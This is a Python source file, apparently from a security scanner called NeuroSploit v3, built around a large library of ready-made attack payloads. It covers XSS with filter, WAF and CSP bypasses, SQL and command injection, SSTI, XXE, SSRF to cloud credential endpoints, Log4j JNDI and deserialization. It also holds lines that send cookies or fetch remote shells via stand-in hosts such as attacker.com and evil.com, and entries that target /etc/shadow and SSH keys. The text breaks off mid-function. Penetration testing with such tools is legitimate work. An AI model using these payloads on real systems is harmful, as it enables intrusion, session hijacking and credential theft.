"""
NeuroSploit v3 - Dynamic Payload Generator

Generates context-aware payloads for vulnerability testing.
"""
from typing import List, Dict, Any, Optional
import json
from pathlib import Path


class PayloadGenerator:
    """
    Generates payloads for vulnerability testing.

    Features:
    - Extensive payload libraries per vulnerability type
    - Context-aware payload selection (WAF bypass, encoding)
    - Dynamic payload generation based on target info
    """

    def __init__(self):
        self.payload_libraries = self._load_payload_libraries()

    def _load_payload_libraries(self) -> Dict[str, List[str]]:
        """Load comprehensive payload libraries"""
        return {
            # XSS Payloads
            "xss_reflected": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<body onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=\"javascript:alert('XSS')\">",
                "<input onfocus=alert('XSS') autofocus>",
                "<marquee onstart=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<video><source onerror=alert('XSS')>",
                "'-alert('XSS')-'",
                "\"-alert('XSS')-\"",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<img src=x onerror=alert(document.domain)>",
                "<svg/onload=alert('XSS')>",
                "<body/onload=alert('XSS')>",
                "<<script>alert('XSS')//<</script>",
                "<ScRiPt>alert('XSS')</sCrIpT>",
                "%3Cscript%3Ealert('XSS')%3C/script%3E",
                "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
            ],
            "xss_stored": [
                # Basic script tags
                "<script>alert(1)</script>",
                "<script>alert(document.domain)</script>",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<Script>alert(1)</Script>",
                "<scr<script>ipt>alert(1)</scr</script>ipt>",
                "<script/src=data:,alert(1)>",
                "<script>alert`1`</script>",
                # IMG event handlers
                "<img src=x onerror=alert(1)>",
                "<img src=x onerror=alert(document.domain)>",
                "<img/src=x onerror=alert(1)>",
                "<img src=1 onerror='alert(1)'>",
                "<IMG SRC=x ONERROR=alert(1)>",
                "<img src onerror=alert(1)>",
                "<img src=x onerror=prompt(1)>",
                "<img src=x onerror=confirm(1)>",
                # SVG event handlers
                "<svg onload=alert(1)>",
                "<svg/onload=alert(1)>",
                "<svg onload=alert(document.domain)>",
                "<svg><script>alert(1)</script></svg>",
                "<svg><animate onbegin=alert(1)>",
                "<svg><set onbegin=alert(1)>",
                # Other element events
                "<body onload=alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<input onblur=alert(1) autofocus><input autofocus>",
                "<details open ontoggle=alert(1)>",
                "<marquee onstart=alert(1)>",
                "<video><source onerror=alert(1)>",
                "<audio src=x onerror=alert(1)>",
                "<video src=x onerror=alert(1)>",
                "<select onfocus=alert(1) autofocus>",
                "<textarea onfocus=alert(1) autofocus>",
                "<xss autofocus tabindex=1 onfocus=alert(1)></xss>",
                "<div contenteditable onblur=alert(1)>click then lose focus</div>",
                # Anchor/link
                "<a href=javascript:alert(1)>click</a>",
                "<a href='javascript:alert(1)'>click me</a>",
                "<a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)>click</a>",
                "<iframe src=javascript:alert(1)>",
                "<embed src=javascript:alert(1)>",
                # Attribute escape + event handlers
                '" onfocus=alert(1) autofocus x="',
                "' onfocus=alert(1) autofocus x='",
                '"><script>alert(1)</script>',
                "'><script>alert(1)</script>",
                '" onmouseover=alert(1) x="',
                "' onmouseover=alert(1) x='",
                '"><img src=x onerror=alert(1)>',
                "'><img src=x onerror=alert(1)>",
                '" autofocus onfocus=alert(1) x="',
                # JavaScript context breakout
                "</script><script>alert(1)</script>",
                "';alert(1)//",
                '";alert(1)//',
                "'-alert(1)-'",
                '"-alert(1)-"',
                "\\\\';;alert(1)//",
                "${alert(1)}",
                "</script><img src=x onerror=alert(1)>",
                # Encoding bypasses
                "%3Cscript%3Ealert(1)%3C/script%3E",
                "&#60;script&#62;alert(1)&#60;/script&#62;",
                "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
                "<script>al\\u0065rt(1)</script>",
                "<scr\\x00ipt>alert(1)</scr\\x00ipt>",
                "javas\\tcript:alert(1)",
                # WAF/filter bypass
                "<img src=x onerror=alert`1`>",
                "<img src=x onerror=window['alert'](1)>",
                "<img src=x onerror=self['alert'](1)>",
                "<img src=x onerror=top['al'+'ert'](1)>",
                "<img src=x onerror=[].constructor.constructor('alert(1)')()>",
                "<img src=x onerror=Function('alert(1)')()>",
                "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
                "<svg><animatetransform onbegin=alert(1)>",
                "<style>@keyframes x{}</style><xss style='animation-name:x' onanimationend='alert(1)'>",
                "<form><button formaction=javascript:alert(1)>X</button></form>",
                "<object data=javascript:alert(1)>",
                "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
            ],
            # XSS Context-Specific Payloads
            "xss_context_html_body": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<body onload=alert(1)>",
                "<xss autofocus tabindex=1 onfocus=alert(1)></xss>",
                "<video><source onerror=alert(1)>",
            ],
            "xss_context_attribute": [
                '" onfocus=alert(1) autofocus x="',
                "' onfocus=alert(1) autofocus x='",
                '"><script>alert(1)</script>',
                "'><script>alert(1)</script>",
                '" onmouseover=alert(1) x="',
                '"><img src=x onerror=alert(1)>',
                '" autofocus onfocus=alert(1) x="',
                "' autofocus onfocus=alert(1) x='",
            ],
            "xss_context_js_string": [
                "';alert(1)//",
                '";alert(1)//',
                "</script><script>alert(1)</script>",
                "'-alert(1)-'",
                "\\\\';;alert(1)//",
                "</script><img src=x onerror=alert(1)>",
            ],
            "xss_context_template_literal": [
                "${alert(1)}",
                "${alert(document.domain)}",
                "${[].constructor.constructor('alert(1)')()}",
            ],
            "xss_context_href": [
                "javascript:alert(1)",
                "javascript:alert(document.domain)",
                "&#106;avascript:alert(1)",
                "java%0ascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
            ],
            "xss_dom": [
                "#<script>alert('DOMXSS')</script>",
                "#\"><script>alert('DOMXSS')</script>",
                "javascript:alert('DOMXSS')",
                "#'-alert('DOMXSS')-'",
            ],

            # SQL Injection Payloads
            "sqli_error": [
                "'",
                "\"",
                "' OR '1'='1",
                "' OR '1'='1'--",
                "' OR '1'='1'/*",
                "\" OR \"1\"=\"1",
                "1' AND '1'='1",
                "1 AND 1=1",
                "' AND ''='",
                "admin'--",
                "') OR ('1'='1",
                "' UNION SELECT NULL--",
                "1' ORDER BY 1--",
                "1' ORDER BY 100--",
                "'; WAITFOR DELAY '0:0:5'--",
                "1; SELECT SLEEP(5)--",
            ],
            "sqli_union": [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT username,password FROM users--",
                "' UNION ALL SELECT NULL,NULL,NULL--",
                "' UNION SELECT @@version--",
                "' UNION SELECT version()--",
                "1 UNION SELECT * FROM information_schema.tables--",
            ],
            "sqli_blind": [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND 'a'='a",
                "' AND 'a'='b",
                "1' AND (SELECT COUNT(*) FROM users)>0--",
                "' AND SUBSTRING(username,1,1)='a'--",
            ],
            "sqli_time": [
                "'; WAITFOR DELAY '0:0:5'--",
                "' AND SLEEP(5)--",
                "' AND (SELECT SLEEP(5))--",
                "'; SELECT pg_sleep(5)--",
                "' AND BENCHMARK(10000000,SHA1('test'))--",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            ],

            # Command Injection
            "command_injection": [
                "; id",
                "| id",
                "|| id",
                "& id",
                "&& id",
                "`id`",
                "$(id)",
                "; whoami",
                "| whoami",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "; ls -la",
                "& dir",
                "| type C:\\Windows\\win.ini",
                "; ping -c 3 127.0.0.1",
                "| ping -n 3 127.0.0.1",
                "\n/bin/cat /etc/passwd",
                "a]); system('id'); //",
            ],

            # SSTI Payloads
            "ssti": [
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "<%= 7*7 %>",
                "{{7*'7'}}",
                "{{config}}",
                "{{self}}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "{{config.items()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "#{T(java.lang.System).getenv()}",
                "${{7*7}}",
            ],

            # NoSQL Injection
            "nosql_injection": [
                '{"$gt": ""}',
                '{"$ne": ""}',
                '{"$regex": ".*"}',
                "admin'||'1'=='1",
                '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
                '{"$where": "1==1"}',
                "true, $where: '1 == 1'",
            ],

            # LFI Payloads
            "lfi": [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "..%2f..%2f..%2fetc/passwd",
                "..%252f..%252f..%252fetc/passwd",
                "/etc/passwd",
                "file:///etc/passwd",
                "....\\....\\....\\windows\\win.ini",
                "..\\..\\..\\windows\\win.ini",
                "/proc/self/environ",
                "php://filter/convert.base64-encode/resource=index.php",
                "php://input",
                "expect://id",
                "/var/log/apache2/access.log",
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
            ],

            # RFI Payloads
            "rfi": [
                "http://evil.com/shell.txt",
                "https://evil.com/shell.txt?",
                "//evil.com/shell.txt",
                "http://evil.com/shell.txt%00",
            ],

            # Path Traversal
            "path_traversal": [
                "../",
                "..\\",
                "....//",
                "....\\\\",
                "%2e%2e%2f",
                "%2e%2e/",
                "..%2f",
                "%2e%2e%5c",
                "..%255c",
                "..%c0%af",
                "..%c1%9c",
            ],

            # XXE Payloads
            "xxe": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo></foo>',
            ],

            # SSRF Payloads
            "ssrf": [
                "http://127.0.0.1",
                "http://localhost",
                "http://169.254.169.254/latest/meta-data/",
                "http://[::1]",
                "http://0.0.0.0",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/metadata/v1/",
                "http://127.0.0.1:22",
                "http://127.0.0.1:3306",
                "http://127.0.0.1:6379",
                "file:///etc/passwd",
                "dict://127.0.0.1:6379/INFO",
                "gopher://127.0.0.1:6379/_INFO",
            ],
            "ssrf_cloud": [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                "http://169.254.169.254/metadata/v1.json",
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            ],

            # Open Redirect
            "open_redirect": [
                "https://evil.com",
                "//evil.com",
                "/\\evil.com",
                "https:evil.com",
                "//evil.com/%2f%2e%2e",
                "////evil.com",
                "https://evil.com@trusted.com",
                "javascript:alert('redirect')",
            ],

            # CORS Test Origins
            "cors_misconfig": [
                "https://evil.com",
                "https://attacker.com",
                "null",
                "https://trusted.com.evil.com",
                "https://trustedcom.evil.com",
            ],

            # JWT Manipulation
            "jwt_manipulation": [
                '{"alg":"none"}',
                '{"alg":"HS256"}',  # Test algorithm confusion
                '{"alg":"RS256"}',
            ],

            # Auth Bypass
            "auth_bypass": [
                "' OR '1'='1",
                "admin'--",
                "admin' #",
                "admin'/*",
                "' OR 1=1--",
                "admin",
                "administrator",
                "' OR ''='",
            ],

            # IDOR
            "idor": [
                "1",
                "2",
                "0",
                "-1",
                "999999",
                "admin",
                "test",
                "../1",
            ],

            # ===== NEW PAYLOAD LIBRARIES (68 new types) =====

            # Advanced Injection
            "ldap_injection": [
                "*", ")(cn=*)", ")(|(cn=*", "*)(uid=*))(|(uid=*",
                "admin)(&)", ")(|(password=*)", "*)(objectClass=*",
            ],
            "xpath_injection": [
                "' or '1'='1", "' or ''='", "'] | //user/* | //user['",
                "' and count(//user)>0 and '1'='1",
            ],
            "graphql_injection": [
                '{__schema{types{name,fields{name,type{name}}}}}',
                '{__type(name:"User"){fields{name}}}',
                '{"query":"mutation{updateUser(role:\\"admin\\"){id}}"}',
            ],
            "crlf_injection": [
                "%0d%0aX-Injected:neurosploit", "%0d%0aSet-Cookie:evil=1",
                "%0d%0a%0d%0a<html>injected", "\\r\\nX-Test:1",
                "%0d%0aLocation:http://evil.com",
            ],
            "header_injection": [
                "evil.com", "%0d%0aInjected:true",
                "target.com\r\nX-Injected: true", "evil.com%00.target.com",
            ],
            "email_injection": [
                "test@test.com%0d%0aCc:attacker@evil.com",
                "test@test.com%0d%0aBcc:spy@evil.com",
                "test@test.com%0aSubject:Hacked",
            ],
            "expression_language_injection": [
                "${7*7}", "#{7*7}", "${applicationScope}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "${pageContext.request.serverName}",
            ],
            "log_injection": [
                "test%0aINFO:Admin_logged_in",
                "${jndi:ldap://attacker.com/a}",
                "test%0a%0aNEW_LOG_ENTRY",
                "\\x1b[31mRED_TEXT",
            ],
            "html_injection": [
                "<h1>INJECTED</h1>", "<b>neurosploit_test</b>",
                "<img src=x>", "<form action='http://evil.com'><input name=pw><input type=submit>",
                "<a href='http://evil.com'>Click Here</a>",
            ],
            "csv_injection": [
                "=cmd|'/C calc'!A0", "=1+1", "+1+1", "@SUM(1+1)",
                '=HYPERLINK("http://evil.com","Click")',
                "-1+1", '=IMPORTXML("http://evil.com","//a")',
            ],
            "orm_injection": [
                "field__gt=0", "field__contains=admin", "field__regex=.*",
                "' OR '1'='1", "field[$ne]=",
            ],

            # XSS Advanced
            "blind_xss": [
                "<script src=//callback.attacker.com></script>",
                "'><script>new Image().src='//attacker.com/?c='+document.cookie</script>",
                "<img src=//callback.attacker.com/blind>",
            ],
            "mutation_xss": [
                "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
                "<svg></p><style><a id=\"</style><img src=1 onerror=alert(1)>\">",
                "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
            ],

            # File Access Advanced
            "arbitrary_file_read": [
                "/etc/passwd", "/etc/shadow", "../../../.env",
                "../../config/database.yml", "/proc/self/environ",
                "~/.ssh/id_rsa", "C:\\Windows\\win.ini",
            ],
            "arbitrary_file_delete": [
                "../../../tmp/test_delete", "../../.htaccess",
                "../../../tmp/neurosploit_test",
            ],
            "zip_slip": [
                "../../tmp/zipslip_test.txt",
                "../../../var/www/html/shell.php",
                "../../../../tmp/zipslip_proof",
            ],

            # Auth Advanced
            "weak_password": [
                "123456", "password", "abc123", "qwerty",
                "aaaaaa", "12345678", "Password1", "test",
            ],
            "default_credentials": [
                "admin:admin", "admin:password", "root:root",
                "test:test", "admin:admin123", "user:user",
                "admin:changeme", "admin:default",
            ],
            "two_factor_bypass": [
                "000000", "123456", "skip_2fa=true",
                "verify=false", "step=3",
            ],
            "oauth_misconfiguration": [
                "redirect_uri=https://evil.com",
                "redirect_uri=https://target.com.evil.com",
                "redirect_uri=https://target.com/callback?next=evil.com",
            ],

            # Authorization Advanced
            "bfla": [
                "/api/admin/users", "/api/admin/settings",
                "/api/admin/create-user", "/admin/config",
            ],
            "mass_assignment": [
                '{"role":"admin"}', '{"is_admin":true}',
                '{"verified":true}', '{"balance":99999}',
                '{"account_type":"premium"}',
            ],
            "forced_browsing": [
                "/admin", "/dashboard", "/api/admin",
                "/internal", "/debug", "/console",
                "/actuator", "/swagger-ui.html", "/.git/config",
                "/.env", "/backup.sql", "/phpinfo.php",
            ],

            # Client-Side Advanced
            "dom_clobbering": [
                '<img id="x" src="evil.com">',
                '<form id="x"><input id="y" value="evil"></form>',
                '<a id="CONFIG" href="evil://payload">',
            ],
            "postmessage_vulnerability": [
                'window.postMessage("inject","*")',
                'window.postMessage(\'{"cmd":"getToken"}\',\'*\')',
            ],
            "websocket_hijacking": [
                "new WebSocket('wss://target.com/ws')",
            ],
            "prototype_pollution": [
                '{"__proto__":{"isAdmin":true}}',
                '{"constructor":{"prototype":{"polluted":true}}}',
                '?__proto__[isAdmin]=true',
                '?__proto__[test]=polluted',
            ],
            "css_injection": [
                "color:red;background:url(//evil.com/test)",
                "};body{background:red}",
                "input[value^='a']{background:url(//evil.com/a)}",
            ],
            "tabnabbing": [
                '<a target="_blank" href="http://test.com">Test</a>',
            ],

            # Infrastructure Advanced
            "directory_listing": [
                "/images/", "/uploads/", "/backup/",
                "/static/", "/assets/", "/media/",
                "/files/", "/docs/", "/data/", "/logs/",
            ],
            "debug_mode": [
                "/nonexistent_page_404_test", "/?debug=true",
                "/phpinfo.php", "/actuator/env",
                "/debug/pprof", "/__debug__/",
            ],
            "exposed_admin_panel": [
                "/admin", "/administrator", "/admin/login",
                "/wp-admin", "/cpanel", "/phpmyadmin",
                "/adminer", "/manager/html", "/jenkins",
            ],
            "exposed_api_docs": [
                "/swagger-ui.html", "/swagger-ui/", "/api-docs",
                "/openapi.json", "/swagger.json", "/graphql",
                "/graphiql", "/redoc", "/v1/api-docs",
            ],
            "insecure_cookie_flags": [],  # Inspection-based, no payloads
            "http_smuggling": [
                "Content-Length: 6\r\nTransfer-Encoding: chunked",
                "Transfer-Encoding: xchunked",
            ],
            "cache_poisoning": [
                "X-Forwarded-Host: evil.com",
                "X-Forwarded-Scheme: nothttps",
                "X-Original-URL: /admin",
            ],

            # Logic & Data
            "race_condition": [],  # Requires concurrent requests, not payloads
            "business_logic": [
                "-1", "0", "0.001", "99999999",
                "-99999", "NaN", "null", "undefined",
            ],
            "rate_limit_bypass": [
                "X-Forwarded-For: 1.2.3.4",
                "X-Real-IP: 1.2.3.4",
                "X-Originating-IP: 1.2.3.4",
            ],
            "parameter_pollution": [
                "param=safe&param=malicious",
                "param[]=a&param[]=b",
            ],
            "type_juggling": [
                "0", "true", "[]", "null",
                '{"password":0}', '{"password":true}',
            ],
            "insecure_deserialization": [
                "rO0ABXNyAA...",  # Java serialization marker
                'O:4:"User":1:{s:4:"role";s:5:"admin";}',  # PHP
                "gASVDAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",  # Python pickle
            ],
            "subdomain_takeover": [],  # DNS-based, not payloads
            "host_header_injection": [
                "evil.com", "target.com:evil.com@evil.com",
                "evil.com%0d%0aX-Injected:true",
            ],
            "timing_attack": [],  # Time-measurement based
            "improper_error_handling": [
                "' \"", "{{invalid}}", "<>!@#$%^&*()",
                "a" * 10000, "\x00\x01\x02", "NaN", "undefined",
            ],
            "sensitive_data_exposure": [],  # Inspection-based
            "information_disclosure": [
                "/.git/config", "/.git/HEAD", "/.svn/entries",
                "/.env", "/robots.txt", "/sitemap.xml",
                "/crossdomain.xml", "/.DS_Store",
            ],
            "api_key_exposure": [],  # JS analysis, not payloads
            "source_code_disclosure": [
                "/.git/config", "/.git/HEAD", "/app.js.map",
                "/main.js.map", "/index.php.bak", "/config.php~",
                "/web.config.old", "/backup.zip",
            ],
            "backup_file_exposure": [
                "/backup.sql", "/dump.sql", "/database.sql",
                "/backup.zip", "/backup.tar.gz", "/site.zip",
                "/db_backup.sql", "/backup/latest.sql",
            ],
            "version_disclosure": [],  # Header inspection

            # Crypto & Supply
            "weak_encryption": [],  # TLS inspection
            "weak_hashing": [],  # Hash analysis
            "weak_random": [],  # Token collection
            "cleartext_transmission": [],  # HTTP inspection
            "vulnerable_dependency": [],  # Version fingerprinting
            "outdated_component": [
                "/readme.html", "/CHANGELOG.md", "/VERSION",
                "/license.txt",
            ],
            "insecure_cdn": [],  # Script tag inspection
            "container_escape": [],  # Container inspection

            # Cloud & API
            "s3_bucket_misconfiguration": [],  # External check
            "cloud_metadata_exposure": [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://metadata.google.internal/computeMetadata/v1/",
            ],
            "serverless_misconfiguration": [],  # Config inspection
            "graphql_introspection": [
                '{__schema{queryType{name},mutationType{name},types{name,kind,fields{name,type{name,kind,ofType{name}}}}}}',
                '{__type(name:"User"){fields{name,type{name}}}}',
            ],
            "graphql_dos": [
                '{"query":"{' + 'user{posts{comments{author' * 5 + '}}}}}' + '}' * 4 + '"}',
            ],
            "rest_api_versioning": [
                "/api/v1/", "/api/v0/", "/v1/", "/api/1.0/",
            ],
            "soap_injection": [
                "?wsdl",
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope><soap:Body>&xxe;</soap:Body></soap:Envelope>',
            ],
            "api_rate_limiting": [],  # Rapid request testing
            "excessive_data_exposure": [],  # Response analysis

            # ===== XSS BYPASS PAYLOAD LIBRARIES =====

            "xss_bypass_event_handlers": [
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<details open ontoggle=alert(1)>",
                "<marquee onstart=alert(1)>",
                "<video><source onerror=alert(1)>",
                "<audio src=x onerror=alert(1)>",
                "<select onfocus=alert(1) autofocus>",
                "<textarea onfocus=alert(1) autofocus>",
                "<input onblur=alert(1) autofocus><input autofocus>",
                "<div contenteditable onblur=alert(1)>x</div>",
                "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
                "<svg><set onbegin=alert(1) attributename=x to=1>",
                "<svg><animatetransform onbegin=alert(1) attributename=x>",
                "<xss autofocus tabindex=1 onfocus=alert(1)></xss>",
                "<xss id=x onfocus=alert(1) tabindex=1>#x</xss>",
                "<input type=image src=x onerror=alert(1)>",
                "<object data=x onerror=alert(1)>",
                "<style>@keyframes x{}</style><xss style='animation-name:x' onanimationend=alert(1)>",
                "<xss onpointerover=alert(1)>hover</xss>",
            ],
            "xss_bypass_custom_tags": [
                "<xss autofocus tabindex=1 onfocus=alert(1)></xss>",
                "<xss id=x onfocus=alert(1) tabindex=1>#x</xss>",
                "<xss onpointerover=alert(1)>hover me</xss>",
                "<xss onfocusin=alert(1) tabindex=1>focus me</xss>",
                "<custom autofocus tabindex=1 onfocus=alert(1)></custom>",
                "<math><mi onfocus=alert(1) tabindex=1>x</mi></math>",
                "<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a></svg>",
                "<svg><discard onbegin=alert(1)>",
                "<svg><animate onbegin=alert(1) attributeName=x>",
            ],
            "xss_bypass_alert_blocked": [
                "<img src=x onerror=confirm(1)>",
                "<img src=x onerror=prompt(1)>",
                "<img src=x onerror=print()>",
                "<img src=x onerror=alert`1`>",
                "<img src=x onerror=window['al'+'ert'](1)>",
                "<img src=x onerror=self['alert'](1)>",
                "<img src=x onerror=top['alert'](1)>",
                "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
                "<img src=x onerror=eval('\\141\\154\\145\\162\\164(1)')>",
                "<img src=x onerror=Function('alert(1)')()>",
                "<img src=x onerror=[].constructor.constructor('alert(1)')()>",
                "<img src=x onerror=setTimeout('alert(1)')>",
            ],
            "xss_bypass_encoding": [
                "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
                "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",
                "<a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)>click</a>",
                "<a href=&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;alert(1)>click</a>",
                "<a href=java%0ascript:alert(1)>click</a>",
                "<a href=java%09script:alert(1)>click</a>",
                "<a href=java%0dscript:alert(1)>click</a>",
                "<svg onload=al\\u0065rt(1)>",
                "<img src=x onerror=al\\u0065rt(1)>",
            ],
            "xss_bypass_waf": [
                "<Img Src=x OnError=alert(1)>",
                "<IMG SRC=x ONERROR=alert(1)>",
                "<img/src=x/onerror=alert(1)>",
                "<img\\tsrc=x\\tonerror=alert(1)>",
                "<img\\nsrc=x\\nonerror=alert(1)>",
                "<<script>alert(1)//<</script>",
                "<svg/onload=alert(1)>",
                "<body/onload=alert(1)>",
                "<input/onfocus=alert(1)/autofocus>",
                "<scr<script>ipt>alert(1)</scr</script>ipt>",
            ],
            "xss_context_event_handler": [
                "alert(1)",
                "alert(document.domain)",
                "alert`1`",
                "confirm(1)",
                "prompt(1)",
            ],
            "xss_context_svg": [
                "<svg onload=alert(1)>",
                "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
                "<svg><set onbegin=alert(1) attributename=x to=1>",
                "<svg><animatetransform onbegin=alert(1) attributename=x>",
                "<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a></svg>",
            ],
            "xss_context_textarea": [
                "</textarea><script>alert(1)</script>",
                "</textarea><img src=x onerror=alert(1)>",
                "</textarea><svg onload=alert(1)>",
            ],
            "xss_context_style": [
                "</style><script>alert(1)</script>",
                "</style><img src=x onerror=alert(1)>",
            ],
            "xss_csp_bypass": [
                "<script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js'></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>",
                "<base href='//evil.com/'>",
                "<script nonce='{{RANDOM_ID}}'>alert(1)</script>",
                "<link rel=prefetch href='//evil.com/'>",
            ],
            "xss_dom_sources": [
                "#<img src=x onerror=alert(1)>",
                "#\"><img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "#'-alert(1)-'",
                "?default=<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
            ],
            "xss_canonical_accesskey": [
                "<input accesskey=x onclick=alert(1)>",
                "<a href=# accesskey=x onclick=alert(1)>press ALT+SHIFT+X</a>",
            ],
        }

    def get_context_payloads(self, context: str) -> List[str]:
        """Get payloads for a detected injection context.

        Supports enhanced context names from _detect_xss_context_enhanced():
        html_body, html_comment, textarea, title, noscript,
        attribute_double, attribute_single, attribute_unquoted,
        js_string_single, js_string_double, js_template_literal,
        href, script_src, event_handler, svg_context, mathml_context, style
        """
        # Direct match first
        key = f"xss_context_{context}"
        if key in self.payload_libraries:
            return list(self.payload_libraries[key])

        # Fallback mapping for enhanced context names
        _fallback = {
            "attribute_double": "attribute",
            "attribute_single": "attribute",
            "attribute_unquoted": "attribute",
            "js_string_single": "js_string",
            "js_string_double": "js_string",
            "js_template_literal": "template_literal",
            "html_comment": "html_body",
            "title": "textarea",       # needs closing tag breakout like textarea
            "noscript": "textarea",     # needs closing tag breakout
            "script_src": "href",       # URL-like context
            "event_handler": "event_handler",
            "svg_context": "svg",
            "mathml_context": "html_body",
            "style": "style",
        }
        fallback_ctx = _fallback.get(context)
        if fallback_ctx:
            fb_key = f"xss_context_{fallback_ctx}"
            if fb_key in self.payload_libraries:
                return list(self.payload_libraries[fb_key])

        # Ultimate fallback: top stored XSS payloads
        return list(self.payload_libraries.get("xss_stored", []))[:10]

    def get_filter_bypass_payloads(self, filter_map: Dict[str, Any]) -> List[str]:
        """Get bypass payloads based on what's blocked/allowed by filters.

        filter_map keys:
          - allowed_chars: list of chars that pass through
          - blocked_chars: list of chars that are stripped/encoded
          - allowed_tags: list of HTML tags that survive
          - blocked_tags: list of HTML tags that are stripped
          - allowed_events: list of event handlers that survive
          - blocked_events: list of event handlers stripped
          - csp: CSP header value (or None)
          - waf_detected: bool
        """
        payloads: List[str] = []
        allowed_chars = set(filter_map.get("allowed_chars", []))
        blocked_chars = set(filter_map.get("blocked_chars", []))
        allowed_tags = filter_map.get("allowed_tags", [])
        allowed_events = filter_map.get("allowed_events", [])
        waf = filter_map.get("waf_detected", False)

        # If custom tags allowed, use them
        if allowed_tags:
            for tag in allowed_tags:
                for evt in (allowed_events or ["onfocus", "onload", "onerror"]):
                    if tag in ("svg", "body", "math") and evt in ("onload",):
                        payloads.append(f"<{tag} {evt}=alert(1)>")
                    elif tag in ("img", "video", "audio", "source", "object", "input") and evt in ("onerror",):
                        payloads.append(f"<{tag} src=x {evt}=alert(1)>")
                    elif evt == "onfocus":
                        payloads.append(f"<{tag} {evt}=alert(1) autofocus tabindex=1></{tag}>")
                    elif evt == "onbegin":
                        payloads.append(f"<svg><{tag} {evt}=alert(1)>")
                    elif evt in ("onanimationend",):
                        payloads.append(f"<style>@keyframes x{{}}</style><{tag} style='animation-name:x' {evt}=alert(1)>")
                    else:
                        payloads.append(f"<{tag} {evt}=alert(1)></{tag}>")

        # Event handler bypass payloads
        payloads.extend(self.payload_libraries.get("xss_bypass_event_handlers", []))

        # Custom tag bypass payloads
        payloads.extend(self.payload_libraries.get("xss_bypass_custom_tags", []))

        # If parentheses are blocked, use backtick/encoding variants
        if "(" in blocked_chars or ")" in blocked_chars:
            payloads.extend(self.payload_libraries.get("xss_bypass_alert_blocked", []))

        # If angle brackets are partially blocked, try encoding
        if "<" in blocked_chars or ">" in blocked_chars:
            payloads.extend(self.payload_libraries.get("xss_bypass_encoding", []))

        # WAF-specific bypasses
        if waf:
            payloads.extend(self.payload_libraries.get("xss_bypass_waf", []))

        # CSP bypass payloads
        if filter_map.get("csp"):
            payloads.extend(self.payload_libraries.get("xss_csp_bypass", []))

        # Deduplicate while preserving order
        seen = set()
        unique: List[str] = []
        for p in payloads:
            if p not in seen:
                seen.add(p)
                unique.append(p)
        return unique

    async def get_payloads(
        self,
        vuln_type: str,
        endpoint: Any,
        context: Dict[str, Any]
